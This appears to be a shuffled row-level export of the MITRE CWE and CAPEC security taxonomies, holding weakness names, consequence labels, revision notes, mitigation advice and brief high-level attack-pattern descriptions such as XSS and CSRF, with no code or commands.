11281	39	2008-08-15
20295	57	Primary
5889	80	The attacker needs to figure out the exact invocation of the targeted malicious action and then craft a link that performs the said action. Having the user click on such a link is often accomplished by sending an email or posting such a link to a bulletin board or the likes.
8508	56	ChildOf
8760	62	updated Potential_Mitigations, Time_of_Introduction
18076	59	Updated @Abstraction
14746	21	CWE Content Team
7338	46	When the server relies on protection mechanisms placed on the client side, an attacker can modify the client-side behavior to bypass the protection mechanisms resulting in potentially unexpected interactions between the client and server. The consequences will vary, depending on what the mechanisms are trying to protect.
20528	63	Other
17304	35	MITRE
13733	71	2013
24349	56	ChildOf
19149	28	CWE Content Team
18922	23	The code is structured in a way that relies too much on using      or setting global variables throughout various points in the code, instead of      preserving the associated information in a narrower, more local      context.
21861	76	2018-07-31
14928	28	CWE Content Team
10866	56	CanPrecede
16767	39	2019-01-03
11289	43	Simple
6947	88	Regular Expression without Anchors
10283	85	471
18253	62	Suggested OWASP Top Ten 2004 mapping
22075	103	Primary
19463	55	CAPEC Content Team
6973	104	203
15821	35	MITRE
13278	63	Gain Privileges or Assume Identity
5623	62	updated References, Relationships
15658	31	1000
22660	23	Simple authentication protocols are subject to reflection attacks if a malicious user can use the target machine to impersonate a trusted user.
17669	39	2008-07-01
22222	39	2014-07-30
24172	28	CWE Content Team
20720	35	MITRE
16823	39	2011-06-01
6138	42	Protect the core dump files from unauthorized access.
10023	92	Exploit
14180	102	ChildOf
7431	69	Draft
7699	39	2011-06-01
20381	97	MIME Conversion
13808	63	Varies by Context
10340	33	OWASP
7520	60	10
21108	95	[Convince user to click on link] Finally, the attacker needs to convince a user that is logged into the target website to click on a link to execute the CSRF attack.
20295	90	Language-Independent
7778	39	2014-06-23
24235	39	2012-05-11
14902	25	High
15653	27	Ability to communicate synchronously or asynchronously with server that publishes an over-privileged directory, program, or interface. Optionally, ability to capture output directly through synchronous communication or other method such as FTP.
8734	39	2012-10-30
25141	28	CWE Content Team
13562	35	MITRE
11268	81	Integrity
14918	79	Confidentiality
9104	85	547
15883	28	CWE Content Team
9544	42	Follow the principle of least privilege when assigning access rights to EJB methods. Permission to invoke EJB methods should not be granted to the ANYONE role.
8478	39	2009-07-27
21016	21	7 Pernicious Kingdoms
19401	39	2009-07-27
17042	72	An attacker could modify resources.
8951	39	2014-06-23
25003	59	Updated @Name, Description, Related_Attack_Patterns
18711	28	CWE Content Team
17802	28	CWE Content Team
9808	35	MITRE
15697	47	Gain Privileges
21680	89	Detailed
23259	26	Architecture and Design
12444	59	Updated Related_Weaknesses
22747	85	467
9814	45	Variant
20575	28	CWE Content Team
10581	35	MITRE
23795	47	Execute Unauthorized Commands
6103	31	1000
14998	101	CAPEC Content Team
16477	39	2017-11-08
7093	70	Wikipedia
24288	35	MITRE
16546	39	2009-07-27
7621	63	Varies by Context
7617	62	updated Relationships, Taxonomy_Mappings
19964	39	2008-09-08
22365	35	MITRE
7147	28	CWE Content Team
17776	47	Other
24996	28	Eric Dalci
7905	39	2008-09-08
16402	28	CWE Content Team
13817	90	Language-Independent
23170	31	699
19761	62	updated Relationships
23788	35	MITRE
19902	55	CAPEC Content Team
9277	28	CWE Content Team
7845	45	Variant
20776	79	Confidentiality
15018	63	Varies by Context
12602	39	2009-05-27
8311	39	2008-11-05
11827	28	CWE Content Team
8539	35	MITRE
14810	62	updated Relationships
22519	35	MITRE
24589	28	CWE Content Team
6578	35	MITRE
16277	62	updated References, Relationships, Taxonomy_Mappings
9493	35	MITRE
6083	30	G. McGraw
9991	31	1003
10326	74	2
17442	39	2017-11-08
23369	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Fuzz Tester                            Framework-based Fuzzer
7394	56	ChildOf
18463	100	The MITRE Corporation
12445	81	Confidentiality
8700	86	http://www.theregister.co.uk/2005/02/07/aol_email_theft/
14331	39	2012-10-30
20394	104	312
21533	63	Unexpected State
15801	28	CWE Content Team
17658	51	2018-05-31
10933	59	Updated Activation_Zone, Attack_Phases, Attacker_Skills_or_Knowledge_Required, Description, Description Summary, Examples-Instances, Injection_Vector, Methods_of_Attack, Payload, Payload_Activation_Impact, Resources_Required, Typical_Likelihood_of_Exploit, Typical_Severity
21045	39	2008-11-24
6714	28	CWE Content Team
20649	44	Limited
9494	62	updated Relationships
8223	49	2010
13322	57	Indirect
12961	79	Confidentiality
21191	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
8180	28	CWE Content Team
20897	45	Base
19271	57	Indirect
23715	53	The MITRE Corporation
21408	62	updated Common_Consequences
7972	62	Converted from category to weakness class.
11347	81	Access Control
7490	35	MITRE
21312	39	2017-11-08
9323	35	MITRE
11145	69	Draft
21740	28	CWE Content Team
8781	81	Integrity
16708	42	Use tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session. These may be more effective than strictly automated techniques. This is especially the case with weaknesses that are related to design and business rules.
17597	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
5874	80	Often achieved by nation states in conjunction with commercial cellular providers to conduct cellular traffic intercept and possible traffic injection.
6447	79	Availability
17602	66	The Art of Software Security Assessment
8420	79	Access Control
19284	59	Updated Related_Attack_Patterns
13736	27	A software program that allows a user to man-in-the-middle communications between the client and server, such as a man-in-the-middle proxy.
13052	42	Ensure that proper certificate checking is included in the system design.
23686	39	2009-01-12
8714	35	MITRE
23750	72	If the certificate is not checked, it may be possible for a redirection or spoofing attack to allow a malicious host with a valid certificate to provide data under the guise of a trusted host. While the attacker in question may have a valid certificate, it may simply be a valid certificate for a different site. In order to ensure data integrity, we must check that the certificate is valid, and that it pertains to the site we wish to access.
10605	62	updated Potential_Mitigations
8634	39	2012-05-11
20854	35	MITRE
19330	39	2011-06-01
23938	105	Web Based
8469	56	Requires
10499	101	CAPEC Content Team
16136	62	updated Other_Notes
23489	60	22
23841	42	During program startup, explicitly set the default permissions or umask to the most restrictive setting possible. Also set the appropriate permissions during program installation. This will prevent you from inheriting insecure permissions from any user who installs or runs the program.
18063	28	CWE Content Team
8201	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, Taxonomy_Mappings
8896	28	Eric Dalci
8598	86	http://homes.cerias.purdue.edu/~pmeunier/secprog/sanitized/class1/6.resource%20exhaustion.ppt
21033	33	Tomer Hertz
18794	56	ChildOf
14250	100	The MITRE Corporation
18774	23	An attacker discovers the structure, function, and composition of a type of computer software through black box analysis techniques. 'Black Box' methods involve interacting with the software indirectly, in the absence of direct access to the executable object. Such analysis typically involves interacting with the software at the boundaries of where the software interfaces with a larger execution environment, such as input-output vectors, libraries, or APIs.
13348	35	MITRE
8463	39	2014-07-30
14115	62	updated Common_Consequences
18612	88	Cleartext Storage in the Registry
7565	51	2014-06-23
19978	23	The software does not implement or incorrectly implements one or more security-relevant checks as specified by the design of a standardized algorithm, protocol, or technique.
6311	31	1000
24778	70	Security for REST Web Services
12516	28	Sean Eidemiller
25044	28	CWE Content Team
16534	62	updated Description, Name
7473	28	CWE Content Team
22513	35	MITRE
9118	35	MITRE
18779	45	Variant
10515	35	MITRE
20522	35	Cigital
20847	31	699
11739	28	CWE Content Team
13678	28	CWE Content Team
6399	47	Read Data
11227	47	Unreliable Execution
17176	85	627
11241	28	CWE Content Team
6041	101	CAPEC Content Team
13245	89	Detailed
14447	42	Use locking functionality. This is the recommended solution. Implement some form of locking mechanism around code which alters or reads persistent data in a multithreaded environment.
15856	45	Base
16843	49	2003
10854	28	CWE Content Team
13345	24	MITRE
16230	39	2008-09-08
24507	35	MITRE
25106	39	2010-09-27
23163	23	The software stores raw content or supporting code under the web document root with an extension that is not specifically handled by the server.
24708	39	2008-07-01
18674	57	Resultant
22394	91	Implementation
15052	54	Medium
21592	28	CWE Content Team
21096	39	2009-07-27
16501	35	MITRE
20719	21	CWE Content Team
19872	40	Target client software must allow scripting such as JavaScript and allows executable content delivered using a data URI scheme.
8771	62	updated Time_of_Introduction
13569	62	updated Observed_Examples
18122	28	CWE Content Team
16118	39	2017-11-08
17572	39	2008-10-14
18074	28	CWE Content Team
23679	74	2
9165	35	MITRE
10471	62	updated Potential_Mitigations, Time_of_Introduction
22745	28	CWE Content Team
6718	62	updated Related_Attack_Patterns, Relationships
8699	62	updated Common_Consequences
6220	62	updated Demonstrative_Examples, References, Related_Attack_Patterns, Relationships, Taxonomy_Mappings
22615	47	Bypass Protection Mechanism
22877	62	updated Relationships
21046	62	updated Relationships, Taxonomy_Mappings
17858	79	Availability
7747	28	CWE Content Team
21974	28	CWE Content Team
12838	96	2018-07-02
11372	72	Data from an untrusted (and possibly malicious) source may be integrated.
19371	28	CWE Content Team
6892	103	Primary
10995	77	Automated Static Analysis
12619	31	699
13547	102	ChildOf
17074	30	Saumil Shah
22142	40	The attacker must have knowledge of the target’s mobile phone number.
12904	39	2014-07-30
12917	77	Architecture or Design Review
6386	39	2011-06-01
21070	39	2009-05-27
6945	66	XML External Entities (XXE) Attack
13151	81	Confidentiality
17223	55	CAPEC Content Team
6862	28	Eric Dalci
9499	28	CWE Content Team
15275	81	Confidentiality
21435	100	The MITRE Corporation
10964	71	2011
8262	28	CWE Content Team
23334	26	Implementation
18741	81	Access Control
22569	79	Integrity
6064	77	Automated Static Analysis
22932	62	updated Relationships, Taxonomy_Mappings
22106	86	https://www.researchgate.net/publication/285403022_PROVIDING_A_FRAMEWORK_FOR_EFFECTIVE_SOFTWARE_QUALITY_MEASUREMENT_MAKING_A_SCIENCE_OF_RISK_ASSESSMENT
23674	59	Updated Taxonomy_Mappings
16694	28	CWE Content Team
9853	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
14030	81	Confidentiality
10452	31	1000
18216	23	The software initializes data using hard-coded values that act as   as network resource identifiers.
11308	81	Other
13245	50	Leverage encryption techniques during information transactions so as to protect them from attack patterns of this kind.
15581	62	updated Relationships
22479	28	CWE Content Team
20036	56	ChildOf
10140	26	Operation
11785	62	updated Relationships, Taxonomy_Mappings
17194	28	CWE Content Team
22806	35	Cigital
15961	28	CWE Content Team
16984	28	CWE Content Team
13677	81	Confidentiality
23080	91	Testing
11758	28	CWE Content Team
10478	91	Implementation
8511	56	ChildOf
18250	31	1000
21968	103	Primary
19114	39	2009-07-27
7129	62	Made name and description more specific to match the essence of the rest of the entry.
24478	39	2019-01-03
5992	39	2012-10-30
11215	76	2018-07-31
6261	25	Low
20408	26	Implementation
13387	100	The MITRE Corporation
20889	39	2018-03-27
16368	28	CWE Content Team
7213	26	Implementation
10109	56	ChildOf
23295	35	MITRE
12733	45	Variant
18205	31	699
16368	62	updated Demonstrative_Examples
13496	39	2010-06-21
7491	31	1000
6467	39	2018-03-27
20768	103	Primary
21347	28	CWE Content Team
23448	35	MITRE
10168	35	MITRE
22447	57	Primary
15859	99	SANS Software Security Institute
19406	28	CWE Content Team
22245	35	MITRE
21040	62	updated Demonstrative_Examples, Relationships
20735	35	MITRE
21662	21	PLOVER
24162	62	updated Time_of_Introduction
23597	21	7 Pernicious Kingdoms
20628	101	CAPEC Content Team
20096	97	SQL Injection through SOAP Parameter Tampering
22760	62	updated Common_Consequences
13471	28	CWE Content Team
11044	104	344
25085	28	CWE Content Team
15827	67	Low
6097	35	MITRE
9114	91	Requirements
20724	86	http://bcrypt.sourceforge.net/
7339	60	15
11419	28	CWE Content Team
5847	62	updated Taxonomy_Mappings
19824	35	MITRE
20440	62	updated Related_Attack_Patterns
9959	27	The resources required will differ based upon the type of host discovery being performed. Usually a network scanning tool or scanning script is required due to the volume of requests that must be generated.
18716	21	Landwehr
24599	39	2012-10-30
12628	90	Language-Independent
9226	28	CWE Content Team
13503	39	2011-09-13
16189	21	PLOVER
20175	62	updated Demonstrative_Examples, Potential_Mitigations
17393	28	CWE Content Team
9585	33	Michael Howard
12187	23	This pattern of attack leverages standard requests to learn the exact time associated with a target system. An adversary may be able to use the timestamp returned from the target to attack time-based security algorithms, such as random number generators, or time-based authentication mechanisms.
19052	35	MITRE
25084	91	Architecture and Design
18030	28	CWE Content Team
6390	50	Implementation: Disable scripting languages such as JavaScript in browser
20873	35	MITRE
10497	35	MITRE
25428	35	Cigital
17063	62	updated Common_Consequences
18045	88	Information Exposure Through Self-generated Error Message
17617	35	MITRE
13963	42	Before freeing a pointer, the programmer should make sure that the pointer was previously allocated on the heap and that the memory belongs to the programmer. Freeing an unallocated pointer will cause undefined behavior in the program.
24941	56	ChildOf
15497	56	CanPrecede
18105	24	MITRE
16620	62	updated Observed_Examples
14803	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
19245	92	Explore
24096	39	2019-01-03
24406	62	updated Common_Consequences
24809	74	4
14208	63	Modify Files or Directories
15254	35	MITRE
12564	86	http://en.wikipedia.org/wiki/Hmac
10014	91	Implementation
13948	40	Advanced knowledge about the deployed system and its various software subcomponents and processes.
12863	28	CWE Content Team
21756	26	Architecture and Design
10088	62	added/updated demonstrative examples
24493	100	The MITRE Corporation
22623	90	C++
12406	100	The MITRE Corporation
7528	39	2011-03-29
11192	35	MITRE
8780	59	Updated Related_Attack_Patterns
22516	31	1000
9435	88	Signal Handler Function Associated with Multiple Signals
10233	103	Primary
13893	39	2019-01-03
20790	35	MITRE
22972	44	SOAR Partial
18144	101	CAPEC Content Team
6085	35	MITRE
17959	63	Reduce Maintainability
10825	35	MITRE
8993	25	High
15677	28	CWE Content Team
10547	28	CWE Content Team
23496	28	CWE Content Team
22951	76	2019-09-30
20974	35	MITRE
5844	94	A successful attack of this kind can identify open ports and available services on a system.
22961	39	2011-06-01
8887	28	CWE Content Team
16978	47	Modify Data
23437	51	2014-06-23
13906	56	ChildOf
16329	35	MITRE
5784	54	Medium
11744	28	CWE Content Team
8071	35	MITRE
8757	56	ChildOf
19706	39	2014-07-30
6144	88	Containment Errors (Container Errors)
15183	59	Updated Description Summary
17453	35	MITRE
18739	76	2017-08-04
14062	33	Steve Christey
11947	28	CWE Content Team
17542	25	High
23652	81	Availability
16725	56	ChildOf
16118	28	CWE Content Team
15536	63	Read Application Data
8914	76	2018-07-31
10065	39	2014-07-30
23620	102	ChildOf
11287	66	"Two Security Vulnerabilities in the Spring Framework's MVC" pdf (from 2008)
16764	97	Software Integrity Attack
23960	62	updated Relationships
21921	24	MITRE
21216	28	CWE Content Team
23930	62	updated Relationships
21307	33	Thomas Walter
11763	35	MITRE
11840	26	Architecture and Design
16721	56	ChildOf
19652	31	1000
9768	72	Integer coercion errors result in an incorrect value being stored for the variable in question.
10585	35	MITRE
13351	42	Properly handle each exception. This is the recommended solution. Ensure that all exceptions are handled in such a way that you can be sure of the state of your system at any given moment.
6368	63	Bypass Protection Mechanism
19977	104	570
16336	70	Assured Deletion in the Cloud: Requirements, Challenges and Future Directions
16764	27	Software Integrity Attacks are usually a late stage focus of attack activity which depends upon the success of a chain of prior events. The resources required to perform the attack vary with respect to the overall attack strategy, existing countermeasures which must be bypassed, and the success of early phase attack vectors.
6594	81	Integrity
9664	28	CWE Content Team
20386	62	updated Applicable_Platforms
15917	69	Incomplete
17590	35	MITRE
14198	103	Primary
7629	66	Health Insurance Portability and Accountability Act (HIPAA)
22340	56	ChildOf
20248	56	ChildOf
20496	28	CWE Content Team
16847	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
20158	35	MITRE
10018	72	The user may be redirected to an untrusted page that contains undesired content or malicious script code.
13554	62	Moved this entry higher up in the Research view.
18559	46	A software system that allows UNIX symbolic links (symlink) as part of paths whether in internal code or through user input can allow an attacker to spoof the symbolic link and traverse the file system to unintended locations or access arbitrary files. The symbolic link can permit an attacker to read/write/corrupt a file that they originally did not have permissions to access.
14753	28	CWE Content Team
9769	88	Improper Control of Dynamically-Identified Variables
21656	28	Eric Dalci
7312	60	14
10451	79	Confidentiality
19181	39	2009-03-09
9678	23	An attacker with either direct access to the product assembly process or to the supply of subcomponents used in the product assembly process introduces counterfeit hardware components into product assembly. The assembly containing the counterfeit components results in a system specifically designed for malicious purposes.
22528	55	CAPEC Content Team
17270	35	MITRE
17079	91	Implementation
6307	39	2011-03-29
19320	23	The software filters data in a way that causes it to be reduced or "collapsed" into an unsafe value that violates an expected security property.
22750	62	updated Relationships, Taxonomy_Mappings
21444	28	CWE Content Team
23519	56	ChildOf
12325	35	MITRE
12595	45	Class
15170	101	CAPEC Content Team
22625	28	CWE Content Team
24313	28	CWE Content Team
14519	74	4
24902	28	CWE Content Team
15334	26	Implementation
16659	56	ChildOf
17054	62	updated Relationships, Taxonomy_Mappings
13691	31	1000
13591	31	699
6096	63	Alter Execution Logic
16257	104	44
11055	85	131
6046	91	Architecture and Design
22723	31	1000
19538	90	C++
6075	31	699
18421	73	The attacker may need a little guesswork on the filenames on which the target application would operate.
10029	28	Sean Eidemiller
7355	76	2018-07-31
14456	100	The MITRE Corporation
23795	47	Read Data
18367	62	updated Related_Attack_Patterns
23296	26	Operation
12948	79	Availability
10839	101	CAPEC Content Team
11488	28	CWE Content Team
14942	63	Varies by Context
11493	39	2014-07-30
11530	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
22185	21	CLASP
24265	44	Opportunistic
15768	31	1000
10642	95	[Probe entry points to locate vulnerabilities] The attacker uses the entry points gathered in the "Explore" phase as a target list and injects various UTF-8 encoded payloads to determine if an entry point actually represents a vulnerability with insufficient validation logic and to characterize the extent to which the vulnerability can be exploited.
18136	62	updated Related_Attack_Patterns, Relationships
12997	56	ChildOf
25015	62	updated Common_Consequences
9662	85	609
12670	43	Simple
14427	44	High
12077	79	Availability
10792	28	Eric Dalci
25073	42	Use resource-limiting settings provided by the operating system or environment. For example, when managing system resources in POSIX, setrlimit() can be used to set limits for certain types of resources, and getrlimit() can determine how many resources are available. However, these functions are not available on all operating systems.                   When the current levels get close to the maximum that is defined for the application (see CWE-770), then limit the allocation of further resources to privileged users; alternately, begin releasing resources for less-privileged users. While this mitigation may protect the system from attack, it will not necessarily stop attackers from adversely impacting other users.                   Ensure that the application performs the appropriate error checks and error handling in case resources become unavailable (CWE-703).
12341	35	MITRE
21572	76	2017-05-01
19744	101	CAPEC Content Team
11988	63	Modify Memory
7480	78	Medium
6712	62	updated Demonstrative_Examples, Relationships
5814	57	Primary
25315	28	CWE Content Team
9318	26	Implementation
25009	62	updated Time_of_Introduction
9523	50	Design: Do not rely on client validation or encoding for security purposes.
19096	103	Primary
19255	95	[Generate fuzzed inputs] Given a fuzzing tool, a target input or protocol, and limits on time, complexity, and input variety, generate a list of inputs to try. Although fuzzing is random, it is not exhaustive. Parameters like length, composition, and how many variations to try are important to get the most cost-effective impact from the fuzzer.
10636	77	Dynamic Analysis with Manual Results Interpretation
12470	51	2014-06-23
9640	90	C
18223	62	updated Description, Potential_Mitigations
23311	62	updated Relationships
11102	39	2017-11-08
22469	104	643
7168	94	Denial of Service
10811	59	Updated Resources_Required
19095	62	updated Relationships
16422	78	Very High
18491	28	CWE Content Team
24613	23	This OS fingerprinting probe analyzes the IP 'ID' field sequence number generation algorithm of a remote host. Operating systems generate IP 'ID' numbers differently, allowing an attacker to identify the operating system of the host by examining how is assigns ID numbers when generating response packets. RFC 791 does not specify how ID numbers are chosen or their ranges, so ID sequence generation differs from implementation to implementation. There are two kinds of IP 'ID' sequence number analysis - IP 'ID' Sequencing: analyzing the IP 'ID' sequence generation algorithm for one protocol used by a host and Shared IP 'ID' Sequencing: analyzing the packet ordering via IP 'ID' values spanning multiple protocols, such as between ICMP and TCP.
24194	31	1000
15000	39	2008-10-14
5585	26	Implementation
9388	47	Read Data
14769	28	CWE Content Team
20223	62	updated Common_Consequences
10291	103	Primary
21411	35	MITRE
14061	42	Design object accessor functions to implicitly check values for valid sizes. Ensure that all functions which will be used as a size are checked previous to use as a size. If the language permits, throw exceptions rather than using in-band errors.
6855	85	270
21003	39	2008-09-24
18518	103	Primary
14654	25	High
7422	35	MITRE
11174	39	2009-12-28
24499	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Description Summary, Resources_Required, Solutions_and_Mitigations
18352	35	MITRE
5929	35	MITRE
18422	23	The software does not handle or incorrectly handles when two or more structural elements should be consistent, but are not.
6829	39	2012-10-30
21318	35	MITRE
17171	35	MITRE
16928	28	CWE Content Team
8980	95	[Survey the target] Using a browser or an automated tool, an attacker records all instances of user-controllable input used to contruct XPath queries.
8330	47	Read Data
15351	76	2019-04-04
23628	46	Cross-site scripting (XSS) vulnerabilities occur when:                             1. Untrusted data enters a web application, typically from a web request.                2. The web application dynamically generates a web page that contains this untrusted data.                3. During page generation, the application does not prevent the data from containing content that is executable by a web browser, such as JavaScript, HTML tags, HTML attributes, mouse events, Flash, ActiveX, etc.                4. A victim visits the generated web page through a web browser, which contains malicious script that was injected using the untrusted data.                5. Since the script comes from a web page that was sent by the web server, the victim's web browser executes the malicious script in the context of the web server's domain.                6. This effectively violates the intention of the web browser's same-origin policy, which states that scripts in one domain should not be able to access resources or run code in a different domain.                          There are three main kinds of XSS:                                                Type 1: Reflected XSS (or Non-Persistent) -              The server reads data directly from the HTTP request and reflects it back in the HTTP response. Reflected XSS exploits occur when an attacker causes a victim to supply dangerous content to a vulnerable web application, which is then reflected back to the victim and executed by the web browser. The most common mechanism for delivering malicious content is to include it as a parameter in a URL that is posted publicly or e-mailed directly to the victim. URLs constructed in this manner constitute the core of many phishing schemes, whereby an attacker convinces a victim to visit a URL that refers to a vulnerable site. After the site reflects the attacker's content back to the victim, the content is executed by the victim's browser.                                   Type 2: Stored XSS (or Persistent) -                 The application stores dangerous data in a database, message forum, visitor log, or other trusted data store. At a later time, the dangerous data is subsequently read back into the application and included in dynamic content. From an attacker's perspective, the optimal place to inject malicious content is in an area that is displayed to either many users or particularly interesting users. Interesting users typically have elevated privileges in the application or interact with sensitive data that is valuable to the attacker. If one of these users executes malicious content, the attacker may be able to perform privileged operations on behalf of the user or gain access to sensitive data belonging to the user. For example, the attacker might inject XSS into a log message, which might not be handled properly when an administrator views the logs.                                                Type 0: DOM-Based XSS -                 In DOM-based XSS, the client performs the injection of XSS into the page; in the other types, the server performs the injection. DOM-based XSS generally involves server-controlled, trusted script that is sent to the client, such as Javascript that performs sanity checks on a form before the user submits it. If the server-supplied script processes user-supplied data and then injects it back into the web page (such as with dynamic HTML), then DOM-based XSS is possible.                                       Once the malicious script is injected, the attacker can perform a variety of malicious activities. The attacker could transfer private information, such as cookies that may include session information, from the victim's machine to the attacker. The attacker could send malicious requests to a web site on behalf of the victim, which could be especially dangerous to the site if the victim has administrator privileges to manage that site. Phishing attacks could be used to emulate trusted web sites and trick the victim into entering a password, allowing the attacker to compromise the victim's account on that web site. Finally, the script could exploit a vulnerability in the web browser itself possibly taking over the victim's machine, sometimes referred to as "drive-by hacking."             In many cases, the attack can be launched without the victim even being aware of it. Even with careful users, attackers frequently use a variety of methods to encode the malicious portion of the attack, such as URL encoding or Unicode, so the request looks less suspicious.
5631	62	Improved the White_Box_Definition
20174	79	Confidentiality
25310	96	2018-07-02
18952	59	Updated Related_Weaknesses
16235	23	Files on various operating systems can have a complex format which allows for the storage of other data, in addition to its contents. Often this is metadata about the file, such as a cached thumbnail for an image file. Unless utilities are invoked in a particular way, this data is not visible during the normal use of the file. It is possible for an attacker to store malicious data or code using these facilities, which would be difficult to discover.
17210	36	http://www.redteam-pentesting.de/advisories/rt-sa-2006-005.txt
11182	50	There are tools to scan HTTP requests to the server for valid URL such as URLScan from Microsoft (http://www.microsoft.com/technet/security/tools/urlscan.mspx).
14674	62	updated References, Relationships, Taxonomy_Mappings
13275	62	updated Relationships, Taxonomy_Mappings
16131	39	2011-06-01
10264	63	Execute Unauthorized Code or Commands
10951	55	CAPEC Content Team
18483	62	updated Common_Consequences
5810	35	MITRE
9087	35	MITRE
6588	35	MITRE
20123	100	The MITRE Corporation
23446	35	MITRE
14293	31	699
10980	101	CAPEC Content Team
8861	56	ChildOf
14258	62	updated Relationships
17838	39	2019-06-20
13619	79	Integrity
6686	62	updated Relationships, Taxonomy_Mappings
16561	90	C++
22402	26	Implementation
23983	35	MITRE
21696	42	Explicitly initialize all your variables and other data stores, either during declaration or just before the first usage.
22175	77	Black Box
25196	23	The product does not properly transfer a resource/behavior to another sphere, or improperly imports a resource/behavior from another sphere, in a manner that provides unintended control over that resource.
16472	62	updated Demonstrative_Examples, References, Relationships
12402	91	Architecture and Design
13343	35	MITRE
21598	63	Bypass Protection Mechanism
5902	81	Access Control
20328	28	CWE Content Team
17307	91	Architecture and Design
17839	66	Open redirect vulnerabilities: definition and prevention
20982	62	updated Demonstrative_Examples
18509	48	09
9137	79	Confidentiality
16153	45	Base
6948	100	The MITRE Corporation
6158	28	CWE Content Team
19369	79	Confidentiality
24644	28	CWE Content Team
11584	66	How to stop an ActiveX control from running in Internet Explorer
14410	62	updated Relationships
10326	73	If possible, determine how the secret was selected. If the secret was determined algorithmically (such as by a random number generator) the algorithm may have patterns or dependencies that reduce the size of the secret space. If the secret was created by a human, behavioral factors may, if not completely reduce the space, make some types of secrets more likely than others. (For example, humans may use the same secrets in multiple places or use secrets that look or sound familiar for ease of recall.)
16132	28	CWE Content Team
9837	33	Giovanni Vigna
23651	100	The MITRE Corporation
7393	88	Use of Uninitialized Variable
16903	39	2019-06-20
13064	35	MITRE
15942	100	The MITRE Corporation
23626	33	OWASP
15458	77	Automated Static Analysis
15391	100	The MITRE Corporation
24609	23	An attacker explores a target to identify the names and locations of predictable temporary files for the purpose of launching further attacks against the target. This involves analyzing naming conventions and storage locations of the temporary files created by a target application. If an attacker can predict the names of temporary files they can use this information to mount other attacks, such as information gathering and symlink attacks.
16580	59	Updated Related_Attack_Patterns
14411	89	Detailed
11431	39	2009-07-27
12921	47	Unreliable Execution
10884	28	CWE Content Team
20747	62	updated Name
24695	85	285
19487	103	Primary
8661	28	CWE Content Team
20939	40	The client and/or server must utilize a protocol that has a weakness allowing manipulation of the interaction.
15781	31	1000
22301	28	CWE Content Team
16584	35	MITRE
21753	31	1000
7926	21	PLOVER
13817	45	Base
13171	88	Access of Uninitialized Pointer
11365	39	2012-05-11
9324	66	Attacking Interoperability
13816	59	Updated Attack_Motivation-Consequences, Attack_Prerequisites, Attacker_Skills_or_Knowledge_Required, Description Summary, Related_Weaknesses, Typical_Likelihood_of_Exploit
14371	103	Primary
16955	91	Architecture and Design
14636	42	Use code signing, although this does not protect against any weaknesses that are already in the control.
14379	69	Incomplete
15902	85	502
10860	62	updated Potential_Mitigations, Time_of_Introduction
14332	88	Use of umask() with chmod-style Argument
22171	28	CWE Content Team
21944	35	MITRE
16030	63	Read Application Data
23471	31	1000
12194	39	2017-05-03
17095	63	Execute Unauthorized Code or Commands
15424	39	2017-11-08
16319	39	2014-02-18
8398	100	The MITRE Corporation
14538	81	Access Control
11101	62	updated Relationships, Taxonomy_Mappings
13471	35	MITRE
21487	43	Simple
9545	28	CWE Content Team
9810	81	Integrity
12520	28	CWE Content Team
11143	35	MITRE
15844	88	Permissive Whitelist
12091	28	CWE Content Team
12562	101	CAPEC Content Team
18566	35	MITRE
22393	23	The software uses an API function, data structure, or other entity in a way that relies on properties that are not always guaranteed to hold for that entity.
8164	35	MITRE
13950	28	CWE Content Team
20528	81	Other
6451	35	MITRE
12629	97	Scheme Squatting
12237	26	Architecture and Design
22443	28	Eric Dalci
